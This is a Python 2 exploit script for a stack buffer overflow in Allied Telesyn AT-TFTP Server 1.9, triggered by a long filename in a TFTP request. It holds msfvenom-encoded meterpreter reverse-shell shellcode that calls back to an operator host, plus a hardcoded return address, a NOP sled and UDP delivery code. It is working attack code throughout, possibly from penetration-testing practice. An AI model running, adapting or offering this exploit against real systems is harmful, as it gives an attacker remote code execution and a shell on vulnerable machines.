# 'Name': 'Allied Telesyn TFTP Server 1.9 Long Filename Overflow'

# 'Description': This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.

import sys, socket

# format attftp_long_filename.py <TARGET-IP> <PORT> <LOCAL IP>

rhost = sys.argv[1]
rport = int(sys.argv[2])
lhost = sys.argv[3]

# ret = "\x53\x93\x42\x7e" 	# Return address - Source Metasploit (Little Endian)
ret = "\xd3\xfe\x86\x7c"
nops = "\x90" * (25-len(lhost)) # NOP sled : NOPs + LHOST up to 25 bytes

# msfvenom -b '\x00' -e x86/shikata_ga_nai -p windows/meterpreter/reverse_nonx_tcp lhost=10.11.0.42 lport=443 exitfunc=process -f py

# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 204 (iteration=0)
# x86/shikata_ga_nai chosen with final size 204
# Payload size: 204 bytes
# Final size of py file: 986 bytes

buf =  ""
buf += "\xdb\xc3\xd9\x74\x24\xf4\x58\xbf\x13\x91\xf5\xad\x2b"
buf += "\xc9\xb1\x2e\x31\x78\x1a\x03\x78\x1a\x83\xc0\x04\xe2"
buf += "\xe6\x10\x19\x01\x05\x13\xe2\xa6\x7f\xf8\xa5\xbe\x86"
buf += "\x01\xd6\xc0\x18\xcf\xf2\xb4\xa5\x13\x8e\xb7\x68\x14"
buf += "\x91\xa8\x19\xb3\xb1\x37\xf7\xb7\x86\xad\x06\x26\xd7"
buf += "\x11\x91\x1a\xd9\x58\xac\x63\x18\xd8\x6e\x16\x6a\xa2"
buf += "\x08\xe0\x58\x50\x37\x59\xd6\xd4\x93\x5f\x01\x8c\x50"
buf += "\x43\x88\xda\x29\x60\x2b\x34\xb6\xb4\xb2\x4f\xd4\xe0"
buf += "\xd8\x2e\xdb\x09\xd1\x6b\x47\x41\x51\xbc\x0c\x15\x5a"
buf += "\x37\x62\x8a\xcf\xcc\xea\xba\x51\xb5\xb9\xdc\x05\x0a"
buf += "\x0f\x49\xa1\x1f\x5d\xd6\x19\x86\x18\x9a\xc1\xb9\x8c"
buf += "\xce\x51\x15\x63\xa2\x16\xca\xc0\x17\x10\x0b\xa0\x16"
buf += "\xcd\xdc\x2e\x4e\x41\xbb\x97\x97\xba\xbc\x31\x31\xfc"
buf += "\xeb\xd2\x41\x28\x7c\x44\xb4\xde\x83\xbe\xae\x88\x92"
buf += "\xe2\x48\x1a\x1c\xf9\xff\x8c\x4d\xaa\x99\x15\x26\x51"
buf += "\x99\xb0\x99\xed\x69\x6d\x49\x5a\x21\xeb\xd4\xa4\xfd"
buf += "\x0c\xc0"

tail = ""
tail	+= "\x83\xc4\x28\xc3" 		# <-- esp = add esp 0x28 + retn
tail	+= "\x00netascii\x00"		# Finish as expected by the AT TFTP server

exploit = "\x00\x02" + nops + buf + ret + tail

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # udp port

try: 
    print "\nDelivering package..."
    client.sendto(exploit, (rhost, rport)) # send exploit
    print "\nPackage Delivered!"
except: 
    print "\nCould not connect to " + rhost + ":" +  str(rport) + "!"
